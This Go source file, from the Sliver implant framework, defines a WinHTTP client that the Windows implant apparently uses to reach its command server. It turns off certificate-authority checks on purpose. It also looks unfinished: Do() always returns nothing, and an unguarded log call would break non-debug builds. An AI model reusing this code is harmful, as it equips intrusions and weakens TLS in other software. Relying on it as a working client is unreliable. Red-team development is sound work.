package winhttp

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"
	"net/http"
	"syscall"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// NewWinHTTPClient - Init a new WinHTTPClient
func NewWinHTTPClient(hostname string, port uint16, referrer string, acceptTypes []string) *WinHTTPClient {
	return &WinHTTPClient{
		hostname:    hostname,
		port:        port,
		referrer:    referrer,
		acceptTypes: acceptTypes,
	}
}

// WinHTTPClient - A WinHTTP driver
type WinHTTPClient struct {
	secure   bool
	port     uint16
	hostname string

	referrer    string
	acceptTypes []string
}

// Do - Execute an HTTP request
func (w *WinHTTPClient) Do(req *http.Request) (*http.Response, error) {
	hSession, err := Open(
		req.Header.Get("User-Agent"),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		"",
		"",
		0,
	)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] open failed: %s", err)
		// {{end}}
		return nil, err
	}

	hConnect, err := Connect(hSession, w.hostname, int(w.port))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] connect failed: %s", err)
		// {{end}}
		return nil, err
	}

	openReqFlags := uint32(0)
	hRequest, err := OpenRequest(hConnect, req.Method, req.RequestURI, "", w.referrer, w.acceptTypes, openReqFlags)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] open request failed: %s", err)
		// {{end}}
		return nil, err
	}

	dwFlags := uint32(SECURITY_FLAG_IGNORE_UNKNOWN_CA)
	err = SetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, uintptr(unsafe.Pointer(&dwFlags)), unsafe.Sizeof(dwFlags))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] set option failed: %s", err)
		// {{end}}
		return nil, err
	}

	sendReqContext := uint32(0)
	if req.Body != nil {
		var body []byte
		body, err = io.ReadAll(req.Body)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[winhttp] io read body failed: %s", err)
			// {{end}}
			return nil, err
		}
		err = SendRequest(hRequest, "", &body[0], len(body), len(body), &sendReqContext)
	} else {
		err = SendRequest(hRequest, "", nil, 0, 0, &sendReqContext)
	}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] send request failed: %s", err)
		// {{end}}
		return nil, err
	}

	err = ReceiveResponse(hRequest)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] recv response failed: %s", err)
		// {{end}}
		return nil, err
	}

	utf16Status := make([]uint16, 16)
	statusSize := uint32(unsafe.Sizeof(uint16(0)) * 16)
	err = QueryHeaders(
		hRequest,
		WINHTTP_QUERY_STATUS_CODE,
		"",
		&utf16Status[0],
		&statusSize,
		nil,
	)
	status := syscall.UTF16ToString(utf16Status[:])

	log.Printf("[winhttp] status code: %s", status)

	return nil, nil
}
